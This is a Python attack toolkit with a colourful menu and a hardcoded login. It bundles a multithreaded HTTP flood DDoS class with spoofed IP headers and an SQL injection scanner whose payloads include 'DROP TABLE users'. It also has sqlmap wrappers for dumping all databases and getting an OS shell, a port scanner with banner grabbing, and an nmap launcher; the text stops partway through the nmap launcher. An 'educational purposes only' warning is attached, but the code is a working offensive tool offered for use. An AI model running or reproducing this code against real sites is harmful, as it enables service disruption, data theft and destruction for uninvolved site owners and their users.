#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import xml.etree.ElementTree as ET
from colorama import Fore, Style, init

init(autoreset=True)

USERNAME = "mrzxx"
PASSWORD = "123456"

LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

DDOS_ASCII = Fore.RED + """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""" + Style.RESET_ALL

SQL_INJECT_ASCII = Fore.YELLOW + """
███████╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗███████╗ ██████╗████████╗
██╔════╝██╔═══██╗██║     ██║████╗  ██║██╔════╝██╔════╝██╔═══██╗╚══██╔══╝
███████╗██║   ██║██║     ██║██╔██╗ ██║██║     █████╗  ██║   ██║   ██║   
╚════██║██║   ██║██║     ██║██║╚██╗██║██║     ██╔══╝  ██║   ██║   ██║   
███████║╚██████╔╝███████╗██║██║ ╚████║╚██████╗██║     ╚██████╔╝   ██║   
╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝      ╚═════╝    ╚═╝   
""" + Style.RESET_ALL

SQLMAP_ASCII = Fore.GREEN + """
╔══════════════════════════════════════════════════════════╗
║    ███████╗ ██████╗ ██╗    ███╗   ███╗ █████╗ ██████╗   ║
║    ╚══███╔╝██╔═══██╗██║    ████╗ ████║██╔══██╗██╔══██╗  ║
║      ███╔╝ ██║   ██║██║    ██╔████╔██║███████║██████╔╝  ║
║     ███╔╝  ██║   ██║██║    ██║╚██╔╝██║██╔══██║██╔═══╝   ║
║    ███████╗╚██████╔╝██║    ██║ ╚═╝ ██║██║  ██║██║       ║
║    ╚══════╝ ╚═════╝ ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝       ║
║                                                          ║
║    ╔══════════════════════════════════════════════════╗  ║
║    ║         SQLMAP INJECTION TOOL v2.0               ║  ║
║    ║    100% WORKING - AUTO EXPLOIT - DUMP ALL        ║  ║
║    ╚══════════════════════════════════════════════════╝  ║
╚══════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL

PORT_SCAN_ASCII = Fore.CYAN + """
██████╗  ██████╗ ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║       ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Style.RESET_ALL

NMAP_ASCII = Fore.MAGENTA + """
███╗   ██╗███╗   ███╗ █████╗ ██████╗
████╗  ██║████╗ ████║██╔══██╗██╔══██╗
██╔██╗ ██║██╔████╔██║███████║██████╔╝
██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝
██║ ╚████║██║ ╚═╝ ██║██║  ██║██║
╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
""" + Style.RESET_ALL

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_welcome():
    clear_screen()
    print(Fore.GREEN + "=" * 70)
    print(WELCOME_ASCII)
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)

def login():
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.GREEN + " " * 20 + "LOGIN SYSTEM")
    print(Fore.GREEN + "=" * 50)
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE)
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE)
        
        if username == USERNAME and password == PASSWORD:
            return username
        else:
            attempts -= 1
            print(Fore.RED + f"[!] Wrong credentials! {attempts} attempts remaining")
            time.sleep(1)
    
    return None

def show_user_info(username):
    now = datetime.datetime.now()
    print(Fore.GREEN + "=" * 70)
    print(Fore.CYAN + f" Hallo: {username}")
    print(Fore.CYAN + f" Tanggal: {now.strftime('%d %B %Y')}")
    print(Fore.CYAN + f" Waktu: {now.strftime('%H:%M:%S')}")
    print(Fore.CYAN + f" Creator: mrzxx")
    print(Fore.CYAN + f" Telegram: @Zxxtirwd")
    print(Fore.GREEN + "=" * 70)

class UltraDDoSAttack:
    def __init__(self):
        self.attack_active = False
        self.requests_sent = 0
        self.start_time = 0
        
    def get_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
        }
        
        # Add random headers
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = self.get_random_ip()
        if random.random() > 0.5:
            headers['X-Real-IP'] = self.get_random_ip()
        if random.random() > 0.5:
            headers['Referer'] = f'https://www.google.com/search?q={random.randint(100000,999999)}'
        
        return headers
    
    def http_flood_thread(self, url, proxy=None):
        session = requests.Session()
        session.verify = False
        
        while self.attack_active:
            try:
                headers = self.generate_headers()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                
                # Random request method
                if random.random() > 0.7:
                    session.post(url, headers=headers, timeout=3, proxies=proxies, data={'data': random.randint(1, 1000000)})
                else:
                    session.get(url, headers=headers, timeout=3, proxies=proxies)
                
                self.requests_sent += 1
                
                if self.requests_sent % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.requests_sent / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Requests: {self.requests_sent} | RPS: {rps:.1f} | Time: {int(elapsed)}s", end='\r')
                
            except:
                continue
    
    def start_attack(self, target_url, threads=500, duration=300):
        print(Fore.CYAN + f"\n[+] Target: {target_url}")
        print(Fore.CYAN + f"[+] Threads: {threads}")
        print(Fore.CYAN + f"[+] Duration: {duration} seconds")
        print(Fore.RED + "[!] ULTRA DDoS ATTACK STARTED!\n")
        
        self.attack_active = True
        self.requests_sent = 0
        self.start_time = time.time()
        
        # Start threads
        thread_list = []
        for i in range(threads):
            thread = threading.Thread(target=self.http_flood_thread, args=(target_url,))
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        # Attack timer
        attack_end = time.time() + duration
        while time.time() < attack_end and self.attack_active:
            time.sleep(1)
        
        # Stop attack
        self.attack_active = False
        time.sleep(2)
        
        # Statistics
        total_time = time.time() - self.start_time
        rps = self.requests_sent / total_time if total_time > 0 else 0
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + "[+] ATTACK COMPLETED SUCCESSFULLY!")
        print(Fore.GREEN + f"[+] Total Requests: {self.requests_sent:,}")
        print(Fore.GREEN + f"[+] Attack Duration: {total_time:.1f}s")
        print(Fore.GREEN + f"[+] Average RPS: {rps:.1f}")
        print(Fore.GREEN + f"[+] Target: {target_url}")
        print(Fore.GREEN + "="*70)
        
        # Check if target is down
        try:
            print(Fore.CYAN + "\n[+] Checking target status...")
            test = requests.get(target_url, timeout=10)
            if test.status_code < 500:
                print(Fore.YELLOW + f"[!] Target still responding (Status: {test.status_code})")
            else:
                print(Fore.GREEN + f"[+] Target may be experiencing issues (Status: {test.status_code})")
        except:
            print(Fore.GREEN + "[+] Target appears to be DOWN or unreachable!")

def ddos_attack():
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "ULTRA DDoS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: FOR EDUCATIONAL PURPOSES ONLY!")
    print(Fore.YELLOW + "[!] USE ONLY ON SERVERS YOU OWN OR HAVE PERMISSION!\n")
    
    target = input(Fore.YELLOW + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    try:
        # Test connection
        print(Fore.CYAN + "\n[+] Testing connection to target...")
        test = requests.get(target, timeout=10)
        print(Fore.GREEN + f"[+] Target reachable (Status: {test.status_code})")
    except Exception as e:
        print(Fore.RED + f"[!] Cannot reach target: {str(e)}")
        choice = input(Fore.YELLOW + "[?] Continue anyway? (y/n): ").lower()
        if choice != 'y':
            return
    
    # Get attack parameters
    try:
        threads = int(input(Fore.YELLOW + "\n[?] Attack threads (100-1000, default 500): ") or "500")
        duration = int(input(Fore.YELLOW + "[?] Attack duration seconds (60-600, default 300): ") or "300")
    except:
        threads = 500
        duration = 300
    
    # Safety limits
    threads = max(100, min(1000, threads))
    duration = max(60, min(600, duration))
    
    # Final confirmation
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration} seconds")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): ").lower()
    
    if confirm == 'y':
        attack = UltraDDoSAttack()
        attack.start_attack(target, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def advanced_sql_injection():
    clear_screen()
    print(SQL_INJECT_ASCII)
    print(Fore.YELLOW + " " * 15 + "ADVANCED SQL INJECTION SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    url = input(Fore.YELLOW + "[?] Target URL with parameter (http://site.com/page?id=1): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Analyzing target...")
    
    # Extract parameters
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(Fore.RED + "[!] No parameters found in URL")
        print(Fore.YELLOW + "[!] Example: http://site.com/page.php?id=1")
        input("\n[?] Press Enter to continue...")
        return
    
    param_name = list(params.keys())[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print(Fore.GREEN + f"[+] Parameter found: {param_name}")
    print(Fore.GREEN + f"[+] Base URL: {base_url}")
    print(Fore.GREEN + f"[+] Testing {len(params)} parameter(s)")
    
    # Advanced SQL payloads
    payloads = [
        # Error based
        "'", "\"", "`", "')", "\")", "`)",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        
        # Union based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT @@version--",
        
        # Time based
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        
        # Boolean based
        "' AND 1=1--", "' AND 1=2--",
        "' OR 'a'='a", "' OR 'a'='b",
        
        # Stacked queries
        "'; DROP TABLE users--", "'; SELECT * FROM users--",
    ]
    
    print(Fore.CYAN + "\n[+] Starting advanced SQLi testing...")
    print(Fore.CYAN + f"[+] Testing {len(payloads)} payloads")
    print(Fore.GREEN + "-"*70)
    
    vulnerabilities = []
    session = requests.Session()
    
    for i, payload in enumerate(payloads):
        print(Fore.YELLOW + f"[{i+1}/{len(payloads)}] Testing: {payload[:30]}...", end='\r')
        
        test_url = f"{base_url}?{param_name}={payload}"
        
        try:
            response = session.get(test_url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Check for SQL errors
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Unclosed.*quotation",
                r"Microsoft.*ODBC",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append(payload)
                    print(Fore.GREEN + f"\n[+] VULNERABLE! SQL Error with: {payload}")
                    break
            
            # Check response time for time-based
            if 'SLEEP' in payload or 'WAITFOR' in payload:
                start = time.time()
                session.get(test_url, timeout=15)
                elapsed = time.time() - start
                if elapsed > 4:
                    vulnerabilities.append(payload)
                    print(Fore.GREEN + f"\n[+] TIME-BASED VULNERABLE! Delay: {elapsed:.1f}s with: {payload}")
            
        except Exception as e:
            pass
    
    print(Fore.GREEN + "\n" + "-"*70)
    
    if vulnerabilities:
        print(Fore.GREEN + f"\n[+] Found {len(vulnerabilities)} vulnerabilities!")
        print(Fore.CYAN + "\n[+] Vulnerable payloads:")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(Fore.YELLOW + f"    {i}. {vuln}")
        
        if len(vulnerabilities) > 10:
            print(Fore.YELLOW + f"    ... and {len(vulnerabilities)-10} more")
        
        print(Fore.CYAN + "\n[+] Recommended: Use SQLMap for full exploitation")
        choice = input(Fore.YELLOW + "\n[?] Run SQLMap now? (y/n): ").lower()
        if choice == 'y':
            run_sqlmap(url)
    else:
        print(Fore.RED + "\n[-] No SQLi vulnerabilities detected")
        print(Fore.YELLOW + "[!] Try SQLMap for deeper testing")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def run_sqlmap(target_url):
    clear_screen()
    print(SQLMAP_ASCII)
    print(Fore.GREEN + " " * 15 + "SQLMAP AUTOMATED EXPLOITATION")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.CYAN + "\n[+] SQLMap Attack Options:")
    print(Fore.YELLOW + "[1] Basic scan (Find injections)")
    print(Fore.YELLOW + "[2] Get databases")
    print(Fore.YELLOW + "[3] Get tables")
    print(Fore.YELLOW + "[4] Dump all data")
    print(Fore.YELLOW + "[5] Get OS shell")
    print(Fore.YELLOW + "[6] Full aggressive scan")
    print(Fore.YELLOW + "[7] Custom command")
    print(Fore.GREEN + "-"*70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-7): ").strip()
    
    commands = {
        '1': f"sqlmap -u \"{target_url}\" --batch --level=3 --risk=2",
        '2': f"sqlmap -u \"{target_url}\" --batch --dbs",
        '3': f"sqlmap -u \"{target_url}\" --batch --tables",
        '4': f"sqlmap -u \"{target_url}\" --batch --dump-all --threads=10",
        '5': f"sqlmap -u \"{target_url}\" --batch --os-shell",
        '6': f"sqlmap -u \"{target_url}\" --batch --level=5 --risk=3 --dbs --tables --dump-all --threads=10 --tamper=space2comment"
    }
    
    if choice == '7':
        custom = input(Fore.YELLOW + "[?] Custom SQLMap command: ").strip()
        command = f"sqlmap {custom}"
    elif choice in commands:
        command = commands[choice]
    else:
        print(Fore.RED + "[!] Invalid choice")
        return
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] This may take several minutes...")
    print(Fore.GREEN + "="*70)
    
    try:
        # Check if sqlmap exists
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True)
        
        # Run sqlmap
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Read output in real-time
        print(Fore.CYAN + "\n[+] SQLMap Output:\n")
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                # Colorize output
                line = line.strip()
                if 'target url' in line.lower():
                    print(Fore.CYAN + line)
                elif 'testing' in line.lower():
                    print(Fore.YELLOW + line)
                elif 'vulnerable' in line.lower() or 'injection' in line.lower():
                    print(Fore.GREEN + line)
                elif 'error' in line.lower() or 'failed' in line.lower():
                    print(Fore.RED + line)
                elif 'database' in line.lower() or 'table' in line.lower():
                    print(Fore.MAGENTA + line)
                else:
                    print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + "[+] SQLMap execution completed")
        
    except FileNotFoundError:
        print(Fore.RED + "\n[!] SQLMap not found!")
        print(Fore.YELLOW + "[!] Install with: pip install sqlmap")
        print(Fore.YELLOW + "[!] Or download from: https://github.com/sqlmapproject/sqlmap")
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")

def port_scanner():
    clear_screen()
    print(PORT_SCAN_ASCII)
    print(Fore.CYAN + " " * 20 + "ADVANCED PORT SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    target = input(Fore.YELLOW + "[?] Target IP/Hostname: ").strip()
    
    # Resolve hostname if needed
    try:
        ip = socket.gethostbyname(target)
        print(Fore.GREEN + f"[+] Resolved to IP: {ip}")
    except:
        print(Fore.RED + "[!] Cannot resolve hostname")
        ip = target
    
    # Common ports
    common_ports = [
        (21, "FTP"),
        (22, "SSH"),
        (23, "Telnet"),
        (25, "SMTP"),
        (53, "DNS"),
        (80, "HTTP"),
        (110, "POP3"),
        (111, "RPC"),
        (135, "MSRPC"),
        (139, "NetBIOS"),
        (143, "IMAP"),
        (443, "HTTPS"),
        (445, "SMB"),
        (993, "IMAPS"),
        (995, "POP3S"),
        (1433, "MSSQL"),
        (1521, "Oracle"),
        (1723, "PPTP"),
        (3306, "MySQL"),
        (3389, "RDP"),
        (5432, "PostgreSQL"),
        (5900, "VNC"),
        (6379, "Redis"),
        (8080, "HTTP-Proxy"),
        (8443, "HTTPS-Alt"),
        (9000, "Jenkins"),
        (27017, "MongoDB")
    ]
    
    print(Fore.CYAN + f"\n[+] Scanning {len(common_ports)} common ports...")
    print(Fore.GREEN + "-"*70)
    
    open_ports = []
    
    for port, service in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Port {port}/TCP ({service}): OPEN")
                open_ports.append((port, service))
            else:
                print(Fore.RED + f"[-] Port {port}/TCP ({service}): CLOSED")
        except:
            print(Fore.YELLOW + f"[!] Port {port}/TCP ({service}): ERROR")
        finally:
            sock.close()
    
    print(Fore.GREEN + "-"*70)
    print(Fore.CYAN + f"\n[+] Scan completed!")
    print(Fore.CYAN + f"[+] Found {len(open_ports)} open ports")
    
    if open_ports:
        print(Fore.CYAN + "\n[+] Open ports summary:")
        for port, service in open_ports:
            print(Fore.GREEN + f"    Port {port}: {service}")
    
    # Banner grabbing for open ports
    if open_ports:
        print(Fore.CYAN + "\n[+] Attempting banner grabbing...")
        for port, service in open_ports[:5]:  # Limit to first 5
            try:
                sock = socket.socket()
                sock.settimeout(3)
                sock.connect((ip, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n" if port in [80, 443, 8080, 8443] else b"\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    print(Fore.YELLOW + f"    Port {port} banner: {banner[:50]}...")
                sock.close()
            except:
                pass
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def nmap_scanner():
    clear_screen()
    print(NMAP_ASCII)
    print(Fore.MAGENTA + " " * 25 + "NMAP SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.CYAN + "\n[!] Nmap must be installed on your system!")
    print(Fore.CYAN + "[!] Linux: sudo apt install nmap")
    print(Fore.CYAN + "[!] Windows: Download from https://nmap.org/download.html")
    print(Fore.GREEN + "-" * 70)
    
    # Check if nmap exists
    try:
        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True, timeout=5)
        if "Nmap" not in result.stdout:
            raise FileNotFoundError
        print(Fore.GREEN + "[+] Nmap found: " + result.stdout.split('\n')[0])
    except:
        print(Fore.RED + "[!] Nmap not found or not in PATH")
        print(Fore.YELLOW + "[!] Please install nmap first")
        input("\n[?] Press Enter to continue...")
        return
    
    target = input(Fore.YELLOW + "\n[?] Target IP/Hostname: " + Fore.WHITE).strip()
    
    if not target:
        print(Fore.RED + "[!] Target cannot be empty")
        return
    
    print(Fore.CYAN + "\n[+] Nmap Scan Options:")
    print(Fore.YELLOW + "[1] Quick Scan (Top 100 ports)")
    print(Fore.YELLOW + "[2] Full Port Scan (1-65535)")
    print(Fore.YELLOW + "[3] OS Detection")
    print(Fore.YELLOW + "[4] Service Version Detection")
    print(Fore.YELLOW + "[5] Vulnerability Scan")
    print(Fore.YELLOW + "[6] Aggressive Scan (All options)")
    print(Fore.YELLOW + "[7] Custom Command")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-7): " + Fore.WHITE).strip()
    
    commands = {
        '1': f"nmap -T4 -F {target}",
        '2': f"nmap -T4 -p- {target}",
        '3': f"nmap -T4 -O {target}",
        '4': f"nmap -T4 -sV {target}",
        '5': f"nmap -T4 --script vuln {target}",
        '6': f"nmap -T4 -A {target}"
    }
    
    if choice == '7':
        custom = input(Fore.YELLOW + "[?] Custom nmap command (without 'nmap'): " + Fore.WHITE).strip()
        command = f"nmap {custom}"
    elif choice in commands:
        command = commands[choice]
    else:
        print(Fore.RED + "[!] Invalid choice")
        return
    
